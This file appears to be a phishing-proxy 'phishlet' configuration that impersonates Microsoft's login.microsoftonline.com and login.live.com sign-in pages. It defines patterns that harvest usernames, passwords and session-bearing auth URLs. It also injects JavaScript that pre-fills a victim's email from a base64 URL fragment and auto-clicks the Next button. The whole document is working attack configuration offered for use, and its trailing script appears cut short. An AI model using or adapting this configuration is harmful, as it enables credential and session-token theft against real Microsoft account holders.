force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"

auth_urls:
  - "/"
  - '/kmsi' # can keep simple with / also
  - '/?auth=2'
  - '/common/login'
  - '/common/oauth2/'
  - '/landingv2*'
  - "/ppsecure/*"
  - "/ppsecure/post.srf*"
  - "/landing*"
  - '/common/SAS/ProcessAuth'


credentials:
  username:
    key: "(login|UserName|username|email|account|identifier|utemp)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
    search: '(.*)'
    type: "post"
  custom:
    - key: 'Username'
      search: '"username":"([^"]*)'
      type: "json"
    - key: 'Login'
      search: '"login":"([^"]*)'
      type: "json"
    - key: 'password'
      search: '"password":"([^"]*)'
      type: "json"

login:
  domain: "login.microsoftonline.com"
  path: "/"


js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    trigger_paths: ["/common/oauth2/", "/", "/*", '/common/oauth2/v2.0/authorize']
    script: |
      function lp(){
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        var query = window.location.href;
        if (/#/.test(window.location.href)){
        var res = query.split("#");
        var data1 = res[0];
        var data2 = res[1];
        console.log(data1);
        console.log(data2);
        if (emailId != null) {
        var decodedString = data2;
        if (/^[A-Za-z0-9+/=]+$/.test(data2)) { // check if string is base64 encoded
        try {
          decodedString = window.atob(data2.replace(/[=]/gi, ''));
        } catch (e) {
          console.error('Error decoding base64 string:', e);
        }
      }
      emailId.focus();
      emailId.value = decodedString;
      nextButton.focus();
      nextButton.click();
      console.log("YES!");
      return;
            }
        }
         setTimeout(function(){lp();}, 500);
        }
        setTimeout(function(){lp();}, 500);